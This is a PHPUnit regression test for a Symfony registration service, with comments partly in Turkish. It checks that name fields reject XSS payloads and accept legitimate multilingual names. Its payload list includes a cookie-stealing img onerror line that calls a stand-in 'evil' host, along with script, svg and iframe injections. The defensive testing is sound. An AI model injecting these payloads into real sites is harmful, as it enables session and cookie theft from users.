<?php

declare(strict_types=1);

namespace App\Tests\Unit\Core\Account;

use App\Core\Account\AccountRegistrationService;
use App\Core\Localization\LocaleProvider;
use App\Core\Mail\CpMailerService;
use App\Core\Mail\Repository\MailLogRepository;
use App\Core\Security\Password\BreachChecker;
use App\Core\Security\Password\PasswordHistory;
use App\Core\Security\Password\PasswordPolicy;
use App\Core\Settings\SettingDefinition;
use App\Core\Settings\SettingsRegistry;
use App\Core\Token\TokenReplacer;
use App\Core\Token\TokenTypeRegistry;
use App\Repository\LocaleRepository;
use App\Repository\SettingRepository;
use App\Repository\UserRepository;
use Doctrine\DBAL\DriverManager;
use Doctrine\ORM\EntityManagerInterface;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\MockObject\MockObject;
use PHPUnit\Framework\TestCase;
use Symfony\Component\Cache\Adapter\ArrayAdapter;
use Symfony\Component\HttpClient\MockHttpClient;
use Symfony\Component\HttpClient\Response\MockResponse;
use Symfony\Component\HttpFoundation\RequestStack;
use Symfony\Component\Messenger\MessageBusInterface;
use Symfony\Component\PasswordHasher\Hasher\PasswordHasherFactory;
use Symfony\Component\Routing\Generator\UrlGeneratorInterface;
use Symfony\Component\Security\Core\User\PasswordAuthenticatedUserInterface;
use Symfony\Contracts\Translation\TranslatorInterface;

/**
 * SEC-03 regression test — registration name-field validation.
 * Covers input-layer rejection of XSS payloads; template escaping is a separate layer.
 */
#[CoversClass(AccountRegistrationService::class)]
final class AccountRegistrationServiceTest extends TestCase
{
    private UserRepository&MockObject $userRepository;

    private AccountRegistrationService $service;

    protected function setUp(): void
    {
        $this->userRepository = $this->createMock(UserRepository::class);

        // No email/username conflicts — focus is name fields only.
        $this->userRepository->method('isEmailTakenByAnotherUser')->willReturn(false);
        $this->userRepository->method('findOneByUsername')->willReturn(null);

        // Name fields in required mode so full validation runs.
        $this->service = $this->createService(AccountRegistrationService::FIELD_REQUIRED);
    }

    /** Real SettingsRegistry with mocked repository — final class cannot be doubled. */
    private function createService(string $nameFieldMode): AccountRegistrationService
    {
        $settingRepository = $this->createMock(SettingRepository::class);
        // No DB overrides — each setting falls back to its definition default.
        $settingRepository->method('findAllAsMap')->willReturn([]);

        $localeRepository = $this->createMock(LocaleRepository::class);
        $localeRepository->method('findActive')->willReturn([]);

        $settings = new SettingsRegistry(
            $settingRepository,
            new LocaleProvider($localeRepository, new ArrayAdapter(), 'tr,en', 'tr'),
            new RequestStack(),
            new ArrayAdapter(),
        );

        foreach ([
            'account.show_first_name' => $nameFieldMode,
            'account.show_last_name' => $nameFieldMode,
            'account.username_required' => true,
            'account.require_terms' => false,
        ] as $key => $default) {
            $settings->addDefinition(new SettingDefinition(
                key: $key,
                label: $key,
                type: 'text',
                default: $default,
                variants: [],
                module: 'core',
                group: 'account',
            ));
        }

        // Translator returns keys as-is — assertions target error keys, not translated text.
        $translator = $this->createMock(TranslatorInterface::class);
        $translator->method('trans')->willReturnArgument(0);

        /*
         * PasswordPolicy final — mock edilemez (PHPUnit 11 ClassIsFinalException).
         * Bu test parola kuralını değil ad alanı doğrulamasını ölçüyor, bu yüzden
         * gerçek ama bilinçli olarak izin verici bir politika kuruluyor: sızıntı
         * kontrolü kapalı, HTTP istemcisi hiçbir zaman çağrılmayacak bir sahte,
         * geçmiş tablosu bellek içi SQLite.
         */
        foreach ([
            'security.password_min_length' => 8,
            'security.password_required_classes' => 1,
            'security.password_breach_check' => false,
            'security.password_history_depth' => 0,
        ] as $key => $default) {
            $settings->addDefinition(new SettingDefinition(
                key: $key,
                label: $key,
                type: 'text',
                default: $default,
                variants: [],
                module: 'core',
                group: 'security',
            ));
        }

        $passwordPolicy = new PasswordPolicy(
            $settings,
            new BreachChecker(
                new MockHttpClient(static fn (): MockResponse => new MockResponse('', ['http_code' => 503])),
                new ArrayAdapter(),
            ),
            new PasswordHistory(
                DriverManager::getConnection(['driver' => 'pdo_sqlite', 'memory' => true]),
                new PasswordHasherFactory([
                    PasswordAuthenticatedUserInterface::class => ['algorithm' => 'bcrypt', 'cost' => 4],
                ]),
            ),
            $translator,
        );

        return new AccountRegistrationService(
            $settings,
            $this->userRepository,
            $this->createMock(EntityManagerInterface::class),
            $this->createMock(UrlGeneratorInterface::class),
            $translator,
            // Real CpMailerService — no mail.enabled definition, so no mail is sent.
            new CpMailerService(
                $settings,
                $this->createMock(MessageBusInterface::class),
                $this->createMock(EntityManagerInterface::class),
                $this->createMock(MailLogRepository::class),
            ),
            // Real TokenReplacer, no providers needed — this test never exercises mail sending.
            new TokenReplacer([], new TokenTypeRegistry()),
            $passwordPolicy,
        );
    }

    // Legitimate names must be accepted

    /**
     * Legitimate names including non-Latin scripts and punctuation.
     *
     * @return iterable<string, array{string}>
     */
    public static function legitimateNameProvider(): iterable
    {
        yield 'Turkce (tam set)' => ['Ali Çömez'];
        yield 'Turkce (S, G, I)' => ['Ayşe Gül Şahin'];
        yield 'Turkce (noktasiz i)' => ['Işıl Ünlü'];
        yield 'kesme isareti' => ["O'Brien"];
        yield 'tipografik kesme' => ['O’Brien'];
        yield 'tire' => ['Jean-Luc'];
        yield 'nokta (unvan)' => ['Dr. Ahmet'];
        yield 'Sirpca / Hirvatca' => ['Đorđe Ćirić'];
        yield 'Kiril' => ['Владимир'];
        yield 'Yunanca' => ['Γεώργιος'];
        yield 'Arapca' => ['محمد'];
        yield 'CJK' => ['山田'];
        yield 'aksanli Latin' => ['José Ángel Muñoz'];
        yield 'Almanca eszett' => ['Weiß'];
        yield 'cok parcali' => ['Maria de los Ángeles'];
        yield 'tek harf' => ['X'];
        yield 'tam 60 karakter' => [str_repeat('a', 60)];
    }

    #[DataProvider('legitimateNameProvider')]
    public function testLegitimateNamesAreAccepted(string $name): void
    {
        $errors = $this->service->validate($this->input(firstName: $name, lastName: $name));

        self::assertSame(
            [],
            $errors,
            sprintf('Mesru ad "%s" reddedildi: %s', $name, implode(', ', $errors)),
        );
    }

    // XSS payloads must be rejected

    /**
     * Audit-report attack payloads and close variants.
     *
     * @return iterable<string, array{string}>
     */
    public static function xssPayloadProvider(): iterable
    {
        yield 'img onerror (rapordaki saldiri)' => ['<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">'];
        yield 'script etiketi' => ['<script>alert(1)</script>'];
        yield 'etiket kapatip svg acma' => ['</b><svg onload=alert(1)>'];
        yield 'oznitelik kacisi' => ['Ali" onmouseover="alert(1)'];
        yield 'iframe enjeksiyonu' => ['<iframe src="//evil"></iframe>'];
        yield 'HTML varlik kacisi' => ['a&lt;script&gt;b'];
        yield 'javascript: semasi' => ['<a href="javascript:alert(1)">x</a>'];
        yield 'style enjeksiyonu' => ['<div style="position:fixed">x</div>'];
    }

    #[DataProvider('xssPayloadProvider')]
    public function testXssPayloadsAreRejected(string $payload): void
    {
        $errors = $this->service->validate($this->input(firstName: $payload));

        self::assertContains(
            'account.register.first_name_invalid',
            $errors,
            sprintf('XSS payload KABUL EDILDI — SEC-03 regresyonu: %s', $payload),
        );
    }

    /** Same rule applies to last name — both fields share the denormalization path. */
    #[DataProvider('xssPayloadProvider')]
    public function testXssPayloadsAreRejectedInLastNameToo(string $payload): void
    {
        $errors = $this->service->validate($this->input(lastName: $payload));

        self::assertContains('account.register.last_name_invalid', $errors);
    }

    /**
     * Individual forbidden characters — documents each building block.
     *
     * @return iterable<string, array{string}>
     */
    public static function forbiddenCharacterProvider(): iterable
    {
        yield 'kucuktur (<)' => ['Ali<Veli'];
        yield 'buyuktur (>)' => ['Ali>Veli'];
        yield 've (&)' => ['Ali&Veli'];
        yield 'cift tirnak' => ['Ali"Veli'];
        yield 'egik cizgi' => ['Ali/Veli'];
        yield 'ters egik cizgi' => ['Ali\\Veli'];
        yield 'rakam' => ['Ali123'];
        yield 'yeni satir' => ["Ali\nVeli"];
        yield 'sekme' => ["Ali\tVeli"];
        yield 'NUL bayti' => ["Ali\0Veli"];
        yield 'yuzde' => ['Ali%20Veli'];
        yield 'suslu parantez' => ['Ali{Veli}'];
    }

    #[DataProvider('forbiddenCharacterProvider')]
    public function testForbiddenCharactersAreRejected(string $name): void
    {
        $errors = $this->service->validate($this->input(firstName: $name));

        self::assertContains('account.register.first_name_invalid', $errors);
    }

    // Length limit

    public function testNameLongerThanSixtyCharactersIsRejected(): void
    {
        $errors = $this->service->validate($this->input(firstName: str_repeat('a', 61)));

        self::assertContains('account.register.first_name_too_long', $errors);
    }

    /** Length must be measured in characters (mb_strlen), not bytes. */
    public function testLengthIsMeasuredInCharactersNotBytes(): void
    {
        // 40 characters, each 2 bytes in UTF-8 -> 80 bytes total.
        $name = str_repeat('ş', 40);

        self::assertSame(40, mb_strlen($name));
        self::assertGreaterThan(60, \strlen($name), 'Test verisi bayt olarak 60u asmali.');

        $errors = $this->service->validate($this->input(firstName: $name, lastName: $name));

        self::assertSame([], $errors, 'Uzunluk baytla olculmus — mb_strlen kullanilmali.');
    }

    // Required vs optional field behaviour

    public function testEmptyRequiredNameProducesRequiredError(): void
    {
        $errors = $this->service->validate($this->input(firstName: '', lastName: ''));

        self::assertContains('account.register.first_name_required', $errors);
        self::assertContains('account.register.last_name_required', $errors);

        // Empty field must not also produce "invalid character" — avoid conflicting messages.
        self::assertNotContains('account.register.first_name_invalid', $errors);
    }

    /** Hidden fields (FIELD_HIDDEN) must not be validated at all. */
    public function testHiddenFieldIsNotValidatedAtAll(): void
    {
        $service = $this->createService(AccountRegistrationService::FIELD_HIDDEN);

        // Hidden field skips validation even for XSS — value is not user-supplied.
        $errors = $service->validate($this->input(firstName: '<script>alert(1)</script>', lastName: ''));

        self::assertNotContains('account.register.first_name_invalid', $errors);
        self::assertNotContains('account.register.first_name_required', $errors);
    }

    // Helpers

    /**
     * @return array{email: string, username: string, firstName: string, lastName: string, password: string, passwordConfirm: string, termsAccepted: bool, locale: string}
     */
    private function input(
        string $firstName = 'Ali',
        string $lastName = 'Comez',
        string $email = 'test@example.com',
        string $username = 'testuser',
    ): array {
        return [
            'email' => $email,
            'username' => $username,
            'firstName' => $firstName,
            'lastName' => $lastName,
            'password' => 'gecerli-sifre-123',
            'passwordConfirm' => 'gecerli-sifre-123',
            'termsAccepted' => true,
            'locale' => 'tr',
        ];
    }
}
